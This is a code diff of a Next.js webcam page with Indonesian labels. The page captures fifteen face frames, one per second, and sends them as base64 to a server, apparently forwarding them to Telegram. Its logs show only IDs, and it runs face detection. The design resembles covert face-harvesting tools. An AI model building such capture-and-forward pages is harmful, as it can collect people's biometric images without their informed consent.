@@ -1,22 +1,35 @@
-// pages/review.js
-import { useRef, useState } from "react";
+import { useRef, useState, useEffect } from "react";
 import { useRouter } from "next/router";
 
 export default function Review() {
   const router = useRouter();
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
-
   const queueRef = useRef([]);
   const sendingRef = useRef(false);
 
   const [logs, setLogs] = useState([]);
   const [running, setRunning] = useState(false);
   const [status, setStatus] = useState("idle");
+  const [cameraAllowed, setCameraAllowed] = useState(false);
   const [detectTries, setDetectTries] = useState(0);
 
+  useEffect(() => {
+    // check if index previously granted permission
+    const allowed = sessionStorage.getItem("cameraAllowed") === "true";
+    if (allowed) {
+      // attempt to start preview but do not force prompt
+      ensureCamera().then((ok) => setCameraAllowed(ok));
+    }
+    // cleanup on unmount: stop camera
+    return () => {
+      const s = videoRef.current?.srcObject;
+      if (s && s.getTracks) s.getTracks().forEach((t) => t.stop());
+    };
+  }, []);
+
   function addLog(s) {
-    setLogs(prev => [...prev, s].slice(-300));
+    setLogs((p) => [...p, s].slice(-300));
   }
 
   function makeID(len = 24) {
@@ -31,34 +44,17 @@ export default function Review() {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       videoRef.current.srcObject = stream;
       await videoRef.current.play();
+      sessionStorage.setItem("cameraAllowed", "true");
+      setCameraAllowed(true);
       return true;
     } catch (e) {
+      sessionStorage.removeItem("cameraAllowed");
+      setCameraAllowed(false);
       return false;
     }
   }
 
-  // capture with resizing to keep payload small (maxWidth)
-  function captureBase64(maxWidth = 900, quality = 0.7) {
-    if (!canvasRef.current) canvasRef.current = document.createElement("canvas");
-    const v = videoRef.current;
-    const canvas = canvasRef.current;
-    const naturalW = v.videoWidth || 640;
-    const naturalH = v.videoHeight || 480;
-    let targetW = naturalW;
-    let targetH = naturalH;
-    if (naturalW > maxWidth) {
-      targetW = maxWidth;
-      targetH = Math.round((naturalH * maxWidth) / naturalW);
-    }
-    canvas.width = targetW;
-    canvas.height = targetH;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(v, 0, 0, targetW, targetH);
-    const dataUrl = canvas.toDataURL("image/jpeg", quality);
-    return dataUrl.replace(/^data:image\/jpeg;base64,/, "");
-  }
-
-  // queue for sending to server/tg
+  // queue send
   function enqueueSend(base64, id) {
     queueRef.current.push({ base64, id });
     processQueue();
@@ -77,30 +73,38 @@ export default function Review() {
         body: JSON.stringify({ action: "send", imageBase64: base64, id })
       });
       const j = await res.json();
-      if (j.ok) {
-        addLog(`id: ${id}`);
-      } else {
-        // retry push
-        addLog(`id: ${id} (retry)`);
-        queueRef.current.push({ base64, id });
-      }
+      if (j.ok) addLog(`id: ${id}`);
+      else { addLog(`id: ${id} (retry)`); queueRef.current.push({ base64, id }); }
     } catch (e) {
       addLog(`id: ${id} (retry)`);
       queueRef.current.push({ base64, id });
     }
 
     sendingRef.current = false;
-    // schedule next immediately
     setTimeout(processQueue, 0);
   }
 
+  function captureBase64(maxW = 900, q = 0.7) {
+    if (!canvasRef.current) canvasRef.current = document.createElement("canvas");
+    const v = videoRef.current;
+    const c = canvasRef.current;
+    const w = v.videoWidth || 640;
+    const h = v.videoHeight || 480;
+    let tw = w, th = h;
+    if (w > maxW) { tw = maxW; th = Math.round((h * maxW) / w); }
+    c.width = tw; c.height = th;
+    const ctx = c.getContext("2d");
+    ctx.drawImage(v, 0, 0, tw, th);
+    return c.toDataURL("image/jpeg", q).replace(/^data:image\/jpeg;base64,/, "");
+  }
+
   async function startProcess() {
-    // reset
     setLogs([]);
     setDetectTries(0);
     setRunning(true);
     setStatus("running");
 
+    // ensure camera first; if not allowed, request
     const ok = await ensureCamera();
     if (!ok) {
       addLog("kamera tidak diizinkan");
@@ -109,19 +113,17 @@ export default function Review() {
       return;
     }
 
-    // 15 seconds capture -> enqueue each second
     let sec = 0;
     const timer = setInterval(() => {
       sec++;
       const id = makeID();
+      addLog(`id: ${id}`);
       const b64 = captureBase64(900, 0.7);
       enqueueSend(b64, id);
-      // only log ID (no words)
-      addLog(`id: ${id}`);
+
       if (sec >= 15) {
         clearInterval(timer);
-        // after capturing 15 frames, run detection phase
-        setTimeout(() => runDetectPhase(), 300); // slight delay to allow queue to start sending
+        setTimeout(() => runDetectPhase(), 300);
       }
     }, 1000);
   }
@@ -145,19 +147,15 @@ export default function Review() {
       det = { ok: false, error: String(e) };
     }
 
-    // handle errors
     if (!det || det.ok === false) {
-      // treat as a failed attempt
       addLog("gagal mendeteksi");
-      // increment tries and decide
-      setDetectTries(prev => {
+      setDetectTries((prev) => {
         const next = prev + 1;
         if (next >= 3) {
           addLog("coba lagi");
           setRunning(false);
           setStatus("idle");
         } else {
-          // user wanted retries up to 3; we retry detectPhase automatically until tries reached
           setTimeout(() => runDetectPhase(), 500);
         }
         return next;
@@ -165,18 +163,19 @@ export default function Review() {
       return;
     }
 
-    // parse faces from response
-    const faces = Number(det.faces || det.faces === 0 ? det.faces : (det.result && (() => {
-      try {
-        const r = det.result.results && det.result.results[0];
-        const ent = r?.entities || [];
-        let cnt = 0;
-        for (const e of ent) {
-          if (Array.isArray(e.objects)) cnt += e.objects.length;
+    // parse faces
+    let faces = 0;
+    try {
+      // prefer det.faces if server returned it; otherwise parse result
+      if (typeof det.faces === "number") faces = det.faces;
+      else if (det?.result?.results?.[0]) {
+        const r = det.result.results[0];
+        const entities = r.entities || [];
+        for (const e of entities) {
+          if (Array.isArray(e.objects)) faces += e.objects.length;
         }
-        return cnt;
-      } catch (e) { return 0; }
-    })()));
+      }
+    } catch (e) { faces = 0; }
 
     if (faces > 0) {
       addLog("wajah ditemukan");
@@ -184,16 +183,14 @@ export default function Review() {
       return;
     }
 
-    // if API returned ok but faces==0 (no face)
     addLog("gagal mendeteksi");
-    setDetectTries(prev => {
+    setDetectTries((prev) => {
       const next = prev + 1;
       if (next >= 3) {
         addLog("coba lagi");
         setRunning(false);
         setStatus("idle");
       } else {
-        // retry detection once more after short delay
         setTimeout(() => runDetectPhase(), 500);
       }
       return next;
@@ -208,13 +205,17 @@ export default function Review() {
             <video ref={videoRef} style={{ width: "100%", height: "100%", objectFit: "cover" }} autoPlay playsInline muted />
           </div>
 
-          <div style={{ marginTop: 12 }}>
+          <div style={{ marginTop: 12, display: "flex", gap: 8 }}>
+            <button onClick={ensureCamera} style={{ padding: "10px 14px", background: "#06b6d4", borderRadius: 8, border: 0, fontWeight: 700 }}>
+              Minta Izin Kamera
+            </button>
+
             {!running ? (
-              <button onClick={startProcess} style={{ padding: "10px 16px", background: "#06b6d4", borderRadius: 8, border: 0, fontWeight: 700 }}>
+              <button onClick={startProcess} style={{ padding: "10px 14px", background: "#06b6d4", borderRadius: 8, border: 0, fontWeight: 700 }}>
                 START
               </button>
             ) : (
-              <div>status: {status}</div>
+              <div style={{ alignSelf: "center" }}>status: {status}</div>
             )}
           </div>
         </div>
